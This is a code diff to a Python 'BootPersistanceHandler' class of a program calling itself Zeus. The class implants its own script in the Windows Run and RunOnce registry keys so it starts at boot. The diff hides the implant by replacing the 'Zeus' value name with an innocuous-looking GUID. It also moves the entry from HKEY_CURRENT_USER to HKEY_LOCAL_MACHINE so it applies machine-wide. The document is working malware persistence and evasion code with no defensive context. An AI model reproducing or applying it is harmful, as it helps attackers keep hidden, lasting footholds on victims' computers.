@@ -29,6 +29,8 @@ class BootPersistanceHandler:
     WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
     WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
 
+    WINDOWS_REGISTRY_KEY_NAME = "{60FC6C3A-6AFC-4D03-8B7D-D864AFD83400}"
+
     #
     # Main
     #
@@ -71,13 +73,13 @@ class BootPersistanceHandler:
 
     def addSelfToRegistryPath(self, regPath):
         try:
-            isKeyExistsInRegistry = self.checkRegistryKey(regPath, "Zeus", os.path.abspath(__file__))
+            isKeyExistsInRegistry = self.checkRegistryKey(regPath, self.WINDOWS_REGISTRY_KEY_NAME, os.path.abspath(__file__))
             if isKeyExistsInRegistry:
                 print(r"[i] Zeus already installed in: %s!" % regPath)
             else:
                 print(r"[i] Implanting Zeus to windows registry to: %s" % regPath)
 
-                didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__), regPath)
+                didSaveKeySuccessfully = self.setRegistryValue(self.WINDOWS_REGISTRY_KEY_NAME, os.path.abspath(__file__), regPath)
                 if not didSaveKeySuccessfully:
                     print("[e] Error adding Zeus to windows registry run key.")
         except EnvironmentError:
@@ -85,8 +87,8 @@ class BootPersistanceHandler:
 
     def setRegistryValue(self, name, value, regPath):
         try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, regPath)
-            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, regPath, 0, winreg.KEY_WRITE)
+            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, regPath)
+            registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, regPath, 0, winreg.KEY_WRITE)
             winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
             winreg.CloseKey(registry_key)
             return True
@@ -94,14 +96,14 @@ class BootPersistanceHandler:
             return False
 
     def checkRegistryKey(self, regPath, key, value):
-        registryConnect = ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        registryConnect = ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
         zeusKey = winreg.OpenKey(registryConnect,  regPath)
         keyvalues = self.valuesToDict(zeusKey)
         zeusKey.Close()
 
-        if "Zeus" in keyvalues:
-            zeusPath = keyvalues['Zeus']
-            if zeusPath == os.path.abspath(__file__):
+        if key in keyvalues:
+            result = keyvalues[key]
+            if result == value:
                 return True
 
         return  False
